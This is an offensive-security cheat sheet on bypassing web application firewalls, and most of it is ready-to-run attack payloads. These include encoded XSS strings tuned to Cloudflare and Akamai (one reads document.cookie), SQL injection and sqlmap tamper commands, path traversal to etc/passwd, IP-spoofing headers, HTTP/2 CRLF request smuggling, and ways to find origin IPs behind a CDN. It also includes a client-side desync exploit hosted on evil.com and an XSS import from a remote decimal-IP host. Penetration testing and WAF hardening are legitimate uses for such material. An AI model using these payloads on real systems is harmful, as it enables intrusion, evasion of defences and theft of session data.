---
tags:
  - high
  - infra
---

# WAF Bypass Techniques

*Evade Web Application Firewalls via encoding tricks, protocol abuse, header injection, and architectural bypasses.*

## TL;DR

```bash
# URL encoding bypass (path-based pattern matching)
curl --path-as-is "https://target.com/admin%2fpanel"

# Double encoding
%253Cscript%253E → WAF sees %3Cscript%3E, app decodes to <script>

# Finding real IP behind WAF
dig TXT target.com | grep "v=spf1"
curl -H "Host: target.com" http://REAL_IP/path
```

---

## WAF Fingerprinting

```bash
# Passive fingerprinting
wafw00f https://target.com

# Header-based identification
# Cloudflare: cf-ray, cf-cache-status
# Akamai: x-check-cacheable, x-akamai-*
# Checkpoint: x-cp-via
# F5 BIG-IP: BIGipServer* cookie
# AWS WAF: x-amzn-requestid
# Imperva/Incapsula: visid_incap_*, incap_ses_*
```

---

## URL Encoding & Path Normalization

### Slash Encoding (%2f)

Some WAFs pattern-match on literal path strings but don't normalize URL-encoded characters before matching.

```bash
# WAF blocks: /admin/panel
# Bypass:
curl --path-as-is "https://target.com/admin%2fpanel"

# %2f encodes the slash → breaks the literal pattern match
# Backend decodes %2f back to / and routes correctly
# Requires --path-as-is in curl to prevent normalization
```

### Double Encoding

WAF decodes once; application decodes again.

```
%253C → WAF decodes to %3C → app decodes to <
%2526 → WAF decodes to %26 → app decodes to &
%252f → WAF decodes to %2f → app decodes to /
```

```bash
# XSS double-encoded
%253Cscript%253Ealert(1)%253C%2fscript%253E

# SQLi double-encoded
1%2520UNION%2520SELECT%25201--

# Path traversal
%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### Tab and Special Characters

```bash
# Null byte
/admin%00/panel         # Some WAFs stop at null
/admin%00.jpg           # Extension bypass

# Tab character
/admin%09/panel

# Semicolon
/admin;/panel           # Java/Spring treat ; as path param separator

# Dot segments
/./admin/panel
/admin/./panel
//admin/panel           # Double slash (nginx often passes to backend)

# Mixed case (case-sensitive routes on case-insensitive WAF)
/Admin/Panel
/ADMIN/panel
```

### Unicode and Fullwidth Characters

Windows/IIS with ANSI codepage converts Unicode to ASCII equivalents. Bypasses both WAF and server-side filters.

```
Fullwidth:
／ (U+FF0F) → /
．(U+FF0E) → .
＼(U+FF3C) → \

Confusables:
ａ (U+FF41) → a
ｓ (U+FF53) → s

Path traversal with Unicode:
..／..／etc／passwd
```

Reference tool: https://worst.fit/mapping/

---

## Header Injection Bypasses

### IP Spoofing Headers

```http
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Originating-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
```

!!! tip "When useful"
    WAF rules that whitelist "internal" IP ranges may be bypassed by spoofing localhost in these headers if the WAF trusts them without validation.

### URL Override Headers

```http
X-Original-URL: /admin/panel
X-Rewrite-URL: /admin/panel
X-HTTP-Method-Override: GET
```

!!! warning "False positives"
    `X-Original-URL` / `X-Rewrite-URL` often return CDN-cached content, not the actual protected resource. Verify the response is real (different ETag/content) before claiming a bypass.

### 403 Bypass Patterns

```bash
# Path variations
/secret → /./secret
/secret → /secret/.
/secret → /secret%20
/secret → /secret%09
/secret → /;/secret
/secret → /secret..;/
/secret → //secret

# Method override
POST /secret HTTP/1.1
X-HTTP-Method-Override: GET
```

---

## XSS Payload Bypasses

### Cloudflare

```html
<!-- Mixed case -->
<Img Src=OnXSS OnErroR=confirm(document.cookie)>

<!-- SVG variants -->
<svg onload=prompt%26%230000000040document.domain)>
<svg on onload=(alert)(document.domain)>
<svg onx=() onload=window.alert?.()>

<!-- Unicode null in event name -->
"onx+%00+onpointerenter%3dalert(domain)+x"

<!-- Iframe srcdoc with entities -->
<iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>

<!-- Import from decimal IP -->
<img src=x onError=import('//1152848220/')>

<!-- content-visibility event -->
<input type="hidden" oncontentvisibilityautostatechange="alert(1)" style="content-visibility:auto">

<!-- Backtick template string -->
<svg/OnLoad="`${prompt``}`">

<!-- Tab-broken javascript: URL -->
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;alert(document.domain)&rpar;">X</a>
```

### Akamai

```html
<!-- MathML + tab entities (Firefox) -->
<math><archy href=Ja&Tab;vascript&colon;console.error(1)>ARCHY</archy></math>

<!-- details/ontoggle -->
<details ontoggle=print() open>payload</details>

<!-- onbeforetoggle with decodeURI wrapper -->
<button popovertarget=x>Click</button><hvita onbeforetoggle=alert() popover id=x>X</hvita>

<!-- Case alternation + URL encoding -->
<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
```

### HTML Entity Bypass

When a sanitizer checks raw bytes but the browser decodes HTML entities after filtering:

```
&apos;);alert(1)//    → browser renders: ');alert(1)//
&quot;onload=alert(1) → browser renders: "onload=alert(1)
&#x27;               → single quote (bypasses `/'` char class filters)
```

**Use in**: innerHTML/postMessage sinks where regex runs before DOM insertion.

---

## SQLi WAF Bypass

```bash
# sqlmap with tamper scripts
sqlmap -u "https://target.com/?id=1" \
  --tamper=between,randomcase,charunicodeencode,space2comment

# Inline comments
1/**/UNION/**/SELECT/**/1,2,user()--

# Case variation
1 UnIoN SeLeCt 1,2,3--

# Whitespace alternatives
1%09UNION%0bSELECT%0d1,2,3--

# Hex encoding
SELECT 0x61646d696e  -- → 'admin'

# Boolean-based (avoids UNION detection)
1 AND ASCII(SUBSTRING(database(),1,1)) > 97
```

---

## GraphQL WAF Bypass

```bash
# Newline in __schema breaks regex patterns
GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D

# GET instead of POST (avoids POST body inspection)
GET /graphql?query={__schema{queryType{name}}}

# Content-Type switch
Content-Type: application/x-www-form-urlencoded
body: query={__schema{types{name}}}
```

---

## H2 Downgrade / Request Smuggling Bypass

Both Cloudflare and Akamai terminate HTTP/2 and forward HTTP/1.1 internally. CRLF injection in H2 header values creates smuggled requests.

```
# HTTP/2 request with CRLF in header value
:method GET
:path /
:authority target.com
injected-header: value\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com
```

- H2 headers are framed (not CRLF-delimited), so CRLF in a value passes to the H1.1 backend as a header separator
- Affected: Cloudflare, Akamai, and most H2-terminating proxies

See [Request Smuggling](request-smuggling.md) for full exploitation.

---

## IP Rotation & Real IP Discovery

### Finding Real IP Behind CDN/WAF

```bash
# SPF/MX records often reveal origin IP
dig TXT target.com | grep "v=spf1"
dig MX target.com

# Historical DNS (pre-CDN)
# SecurityTrails, ViewDNS, PassiveDNS

# Shodan cert search
# ssl.cert.subject.cn:target.com

# Then hit real IP directly
curl -H "Host: target.com" http://REAL_IP/path
```

!!! tip "Direct IP bypass"
    If the WAF terminates connections at a virtual IP and the origin accepts direct connections, requests to the origin IP with a `Host` header bypass WAF rules entirely.

### User-Agent & Fingerprint Bypass

```bash
# WAFs sometimes apply different rules to bots vs browsers
# Headless browser may bypass rules that block curl

# Simulate a browser
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0" \
  "https://target.com/protected"

# Random UA in WPScan/Nuclei
wpscan --url https://target.com --random-user-agent
nuclei -u https://target.com -H "User-Agent: Mozilla/5.0..."
```

---

## ModSecurity / OWASP CRS Bypasses

```bash
# CRS blocks "UNION SELECT" but not with SQL comments
1 /*!UNION*/ /*!SELECT*/ 1,2,3--

# CRS checks for <script> but not Unicode escapes
<script> → \u003cscript\u003e (bypass in JSON contexts)

# Version-specific: CRS < 3.3.0 misses certain nested contexts
# Always check CRS version in error headers
```

---

## AWS WAF Bypasses

```bash
# AWS WAF inspects body up to 8KB — large bodies may skip inspection
# Send payload beyond 8KB offset
python3 -c "print('A'*8192 + 'PAYLOAD')"

# JSON body type confusion (some rules match JSON only)
Content-Type: text/plain
body: {"key": "' OR 1=1--"}
```

---

## Client-Side Desync → WAF Bypass

Host a page on `evil.com` that causes the victim's browser to desync the target server's connection parser, then redirect them to the target. Bypasses WAF because the smuggled request is never inspected.

```javascript
// evil.com/exploit.html
fetch('https://target.com/redirect', {
    method: 'POST',
    body: `HEAD /404/ HTTP/1.1\r\nHost: target.com\r\n\r\nGET /payload?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,
    credentials: 'include',
    mode: 'cors'
}).catch(() => { location = 'https://target.com/' })
```

---

## WAF Bypass Checklist

- [ ] URL encode slashes in path (`%2f`) with `--path-as-is`
- [ ] Double encode payloads (`%253C`, `%252f`)
- [ ] Tab/null byte in path (`%09`, `%00`)
- [ ] Semicolon path parameter (`;` before restricted segment)
- [ ] IP spoof headers (`X-Forwarded-For: 127.0.0.1`)
- [ ] `X-Original-URL` / `X-Rewrite-URL` (verify it's not a cache false positive)
- [ ] Real IP discovery (SPF, historical DNS, Shodan cert)
- [ ] HTTP/2 CRLF injection in header values
- [ ] Large body exceeding WAF inspection limit (AWS WAF 8KB)
- [ ] Mixed case in keywords and tags
- [ ] SQL comments (`/**/`, `/*!*/`)
- [ ] Browser headless vs curl difference (different WAF rule sets)
- [ ] Alternative Content-Type for body inspection bypass

---

## Tools

| Tool | Purpose |
|------|---------|
| `wafw00f` | WAF fingerprinting |
| `sqlmap --tamper=*` | SQLi evasion |
| Burp Hackvertor | Live encoding transformer |
| `nuclei -tags bypass` | Automated bypass checks |
| https://worst.fit/mapping/ | Unicode confusables lookup |

---

## References

- [Cloudflare WAF Bypass Research (2025)](https://portswigger.net/research)
- [gprime31/WAF-bypass-xss-payloads](https://github.com/gprime31/WAF-bypass-xss-payloads)
- [PayloadsAllTheThings — WAF Bypass](https://github.com/carlospolop/PayloadsAllTheThings/tree/master/WAF%20Bypass)
- [PortSwigger — HTTP/2 Desync](https://portswigger.net/research/http2)
- [WorstFit — Unicode mapping tool](https://worst.fit)
